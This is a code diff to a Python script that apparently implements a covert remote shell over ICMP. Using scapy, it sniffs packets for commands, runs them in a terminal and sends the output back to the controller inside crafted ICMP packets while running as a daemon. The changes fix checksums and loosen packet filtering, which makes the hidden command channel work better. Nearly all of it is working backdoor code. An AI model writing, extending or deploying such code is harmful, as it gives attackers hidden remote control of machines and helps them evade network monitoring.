@@ -12,6 +12,7 @@ from scapy.sendrecv import sniff, sendp
 import config
 import opening_terminal
 from CustomICMP import CustomICMP
+from chksum_calculation import calc_checksum
 from opening_terminal import p
 
 destination_mac = "ff:ff:ff:ff:ff:ff"
@@ -25,8 +26,9 @@ def readstdout():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / CustomICMP(type=config.TYPE, id=config.ID,
-                                                                                        code=config.RESPONSE_CODE) / string
+        packet_bytes = bytes(CustomICMP() / string)
+        reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) /
+                        CustomICMP(chksum=calc_checksum(packet_bytes)) / string)
         sendp(reply_packet, verbose=False)
         sys.stdout.write(string + "\n")
 
@@ -36,8 +38,9 @@ def readstderr():
         string = f'{l.decode("cp866", "backslashreplace")}'.strip()
         if string == '':
             continue
-        reply_packet = Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(type=config.TYPE, id=config.ID,
-                                                                                  code=config.RESPONSE_CODE) / string
+        packet_bytes = bytes(CustomICMP() / string)
+        reply_packet = (Ether(dst=destination_mac) / IP(dst=destination_ip) / ICMP(chksum=calc_checksum(packet_bytes)) /
+                        string)
         sendp(reply_packet, verbose=False)
         sys.stderr.write(string + "\n")
 
@@ -49,7 +52,7 @@ def sendcommand(cmd):
 
 def packet_callback(packet):
     global destination_ip, destination_mac
-    if packet[CustomICMP].code == config.REQUEST_CODE and packet[CustomICMP].id == config.ID:
+    if packet[CustomICMP].id == config.ID:
         destination_ip = packet[IP].src
         destination_mac = packet[Ether].src
         received_data = packet[ICMP].payload.load.decode('utf-8')
@@ -64,7 +67,7 @@ def sniff_in_debug():
     t1.start()
     t2.start()
 
-    sniff(filter="icmp", prn=packet_callback)
+    sniff(prn=packet_callback)
 
 
 with Daemonizer() as (is_setup, daemonizer):
